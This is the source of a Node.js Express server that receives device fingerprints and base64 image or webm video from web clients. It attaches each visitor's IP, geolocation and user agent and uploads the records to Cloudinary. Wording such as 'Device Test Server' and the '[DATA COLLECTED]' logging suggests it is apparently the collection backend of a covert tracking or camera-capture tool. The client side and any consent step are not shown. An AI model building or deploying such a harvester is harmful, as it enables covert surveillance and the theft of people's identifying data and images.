const express = require('express');
const cloudinary = require('cloudinary').v2;
const geoip = require('geoip-lite');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

// Configure Cloudinary
try {
  cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET,
    secure: true
  });
} catch (error) {
  console.error('Cloudinary configuration error:', error);
  process.exit(1);
}

const app = express();

// Security middleware with customized CSP
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
        connectSrc: ["'self'", "https://api.ipify.org", `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`],
        imgSrc: ["'self'", "data:", "https://res.cloudinary.com"],
        mediaSrc: ["'self'", "data:", "blob:"],
        frameSrc: ["'self'"],
        fontSrc: ["'self'", "data:"],
        styleSrc: ["'self'", "'unsafe-inline'"]
      }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  })
);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later'
});
app.use(limiter);

// Middleware
app.use(express.json({
  limit: '50mb',
  verify: (req, res, buf, encoding) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      res.status(400).json({ error: 'Invalid JSON' });
      throw new Error('Invalid JSON');
    }
  }
}));
app.use(express.static('public'));

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  next();
});

// Utility Functions
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.ip;
}

function getClientInfo(req) {
  const ip = getClientIp(req);
  const geo = geoip.lookup(ip);
  
  return {
    ip,
    geo: geo ? {
      country: geo.country,
      city: geo.city,
      region: geo.region
    } : null,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString()
  };
}

function logDataCollection(type, data) {
  console.log(`[DATA COLLECTED] ${type} from ${data.ip}`);
}

function generateHash(data) {
  return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
}

async function uploadToCloudinary(data, folderPath) {
  try {
    if (!process.env.CLOUDINARY_CLOUD_NAME || 
        !process.env.CLOUDINARY_API_KEY || 
        !process.env.CLOUDINARY_API_SECRET) {
      throw new Error('Cloudinary credentials not configured');
    }

    const base64Data = Buffer.from(JSON.stringify(data)).toString('base64');
    const result = await cloudinary.uploader.upload(
      `data:application/json;base64,${base64Data}`,
      {
        folder: folderPath,
        resource_type: 'raw',
        format: 'json',
        overwrite: false,
        unique_filename: true,
        timeout: 10000 // 10 second timeout
      }
    );
    
    if (!result.secure_url) {
      throw new Error('Cloudinary upload failed - no URL returned');
    }
    
    return result;
  } catch (error) {
    console.error('Cloudinary upload error details:', {
      error: error.message,
      stack: error.stack,
      folderPath,
      dataSize: JSON.stringify(data).length
    });
    throw error;
  }
}

// Routes
app.get('/', (req, res) => {
  res.json({
    status: 'active',
    message: 'Device Test Server Running',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// Add this new endpoint for IP detection
app.get('/get-ip', (req, res) => {
  const ip = getClientIp(req);
  res.json({ ip });
});

app.post('/collect-fingerprint', async (req, res) => {
  try {
    if (!req.body || typeof req.body !== 'object') {
      console.error('Invalid fingerprint data received:', req.body);
      return res.status(400).json({ error: 'Invalid fingerprint data' });
    }

    const clientInfo = getClientInfo(req);
    console.log('Received fingerprint data from:', clientInfo.ip);
    
    const fingerprintHash = generateHash(req.body);
    const uploadData = { ...clientInfo, ...req.body, fingerprintHash };
    
    console.log('Attempting Cloudinary upload...');
    const result = await uploadToCloudinary(uploadData, 'fingerprints');
    
    console.log('Successfully uploaded fingerprint:', {
      url: result.secure_url,
      ip: clientInfo.ip
    });
    
    res.json({ 
      success: true, 
      url: result.secure_url,
      hash: fingerprintHash
    });

  } catch (error) {
    console.error('Fingerprint endpoint error:', {
      error: error.message,
      stack: error.stack,
      body: req.body
    });
    
    res.status(500).json({ 
      error: 'Failed to save fingerprint',
      details: process.env.NODE_ENV === 'development' ? {
        message: error.message,
        stack: error.stack
      } : null
    });
  }
});

app.post('/collect-media', async (req, res) => {
  try {
    const { data, metadata } = req.body;
    
    if (!data || !metadata || !metadata.media_type) {
      return res.status(400).json({ error: 'Invalid media data' });
    }

    const clientInfo = getClientInfo(req);
    const resourceType = metadata.media_type === 'image' ? 'image' : 'video';
    
    const result = await cloudinary.uploader.upload(
      `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`, 
      {
        folder: 'media',
        resource_type: resourceType,
        overwrite: false,
        unique_filename: true
      }
    );

    logDataCollection('media', clientInfo);
    res.json({ 
      success: true, 
      url: result.secure_url,
      public_id: result.public_id
    });
  } catch (error) {
    console.error('Media upload error:', error);
    res.status(500).json({ 
      error: 'Failed to save media',
      details: process.env.NODE_ENV === 'development' ? error.message : null
    });
  }
});

// Error handling
app.use((req, res, next) => {
  res.status(404).json({ error: 'Not found' });
});

app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
